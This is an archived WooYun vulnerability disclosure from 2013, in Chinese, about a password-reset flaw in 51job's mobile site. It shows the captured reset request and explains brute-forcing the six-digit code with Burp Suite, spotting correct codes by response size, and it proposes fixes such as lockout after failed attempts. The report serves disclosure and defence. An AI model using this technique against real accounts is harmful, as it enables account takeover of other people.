@@ -1,0 +1,254 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		前程无忧的一个密码找回漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		前程无忧的一个密码找回漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/墨水心_Len">墨水心_Len</a> 
+</li><li>提交时间：		2013-03-07 18:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-12：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">近日感冒缠身，请了好几天的假，昨儿气色见好.....（这里还是简单点好）。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">听说提洞写标题描述须谨慎。上面还是简单点好。<br />
+<br />
+<br />
+<br />
+近日感冒缠身，请了好几天的假，昨儿气色见好。就拿起手机偶然滴就下了前程无忧的APP；<br />
+<br />
+N久没登，于是就直达忘记密码填邮箱找回....偶然发现邮件验证码竟然是全数字，于是乎，职业病来袭了！（心想明儿来了再看看吧）。<br />
+<br />
+<br />
+<br />
+谁料，时至现在才想起...<br />
+<br />
+<br />
+<br />
+入正题：<br />
+<br />
+1、看了看，只在移动端可行。就这一道就够了！<br />
+<br />
+</p><pre><code>http://3g.51job.com/my/login.php</code></pre><p class='detail'><br />
+<br />
+2、直接忘记密码-&gt;通过邮箱找回-&gt;写上你要XX的账号邮箱（这个不难得到吧，各种社工）；<br />
+<br />
+</p><p class="detail"><a href="../images/07175651f7ec57557563e775c8e855e93e5de87d.png" target="_blank"><img src="../images/07175651f7ec57557563e775c8e855e93e5de87d.png" alt="QQ截图20130307175613.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3、成功后-&gt;点击重置密码，随便填入验证码，还有你那可爱的密码，并设置好代理。<br />
+<br />
+</p><p class="detail"><a href="../images/07180117fc6944bd569974b4c3f4574d578af1de.png" target="_blank"><img src="../images/07180117fc6944bd569974b4c3f4574d578af1de.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4、抓包获取的请求如下：<br />
+<br />
+</p><pre><code>POST /my/reset_password.php?step=reset_submit HTTP/1.1<br />
+Host: 3g.51job.com<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+Accept-Encoding: gzip, deflate<br />
+DNT: 1<br />
+Referer: http://3g.51job.com/my/reset_password.php?step=reset&amp;verifycode=xxxx&amp;id=xxx<br />
+Cookie: guid=13626475981965640089; nolife=fromdomain%3Dwww; wapsearch=areaid%3D170200; partner=wap<br />
+Connection: keep-alive<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Content-Length: 112<br />
+<br />
+inputcode=123123&amp;password1=他叫马赛克&amp;password2=他也叫马赛克&amp;verifycode=b1fd981aa08206ae6858e10d0e674023&amp;id=45819963</code></pre><p class='detail'><br />
+<br />
+一眼瞄出inputcode为短信验证码，password1和password2为重置密码，verifycode...这个形同虚设，id就不用介绍了吧。<br />
+<br />
+<br />
+<br />
+拿出你那秀气的burp suite，向inputcode进军吧。<br />
+<br />
+</p><p class="detail"><a href="../images/07181416ecd9b9dc7383b4aaa21b51b06d392ca9.png" target="_blank"><img src="../images/07181416ecd9b9dc7383b4aaa21b51b06d392ca9.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+以便于测试，从374000开始。<br />
+<br />
+</p><p class="detail"><a href="../images/071818371089df129d18998eb43cc93733ec195d.png" target="_blank"><img src="../images/071818371089df129d18998eb43cc93733ec195d.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+通过返回的字节数来识别是否为正确的验证码。<br />
+<br />
+错误时，字节数返回71xx，正确时返回6524；<br />
+<br />
+<br />
+<br />
+错误：<br />
+<br />
+</p><p class="detail"><a href="../images/07182855ece19de51b8aa377d5b2265bdfd87746.png" target="_blank"><img src="../images/07182855ece19de51b8aa377d5b2265bdfd87746.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+正确：<br />
+<br />
+</p><p class="detail"><a href="../images/071834519e1c589c5a6e7cf001714d8ea9471169.png" target="_blank"><img src="../images/071834519e1c589c5a6e7cf001714d8ea9471169.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+真相：<br />
+<br />
+</p><p class="detail"><a href="../images/07183628b29c0029ca978b02503638e8f4be1cd5.png" target="_blank"><img src="../images/07183628b29c0029ca978b02503638e8f4be1cd5.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见上。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、verifycode形同虚设，多加几道验证吧。<br />
+<br />
+<br />
+<br />
+2、6位纯数字短信码的爆破，即平均50万次的请求，我使用了burpsuite测试单台机器100线程，8分多钟即可重置任意一个手机账号！危险啊<br />
+<br />
+<br />
+<br />
+3、短信码可以为6位纯数字，甚至可以缩短为4为纯数字；可以不设置图片验证码，甚至可以不用设置短信码的有效期。但是为什么不设置连续5次尝试失败就锁定本次密码重置的请求呢？<br />
+<br />
+<br />
+<br />
+修复方案引用 @风萧萧 . </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/墨水心_Len" title="墨水心_Len">墨水心_Len</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019700" title="前程无忧的一个密码找回漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-03-07 18:56</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19700";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
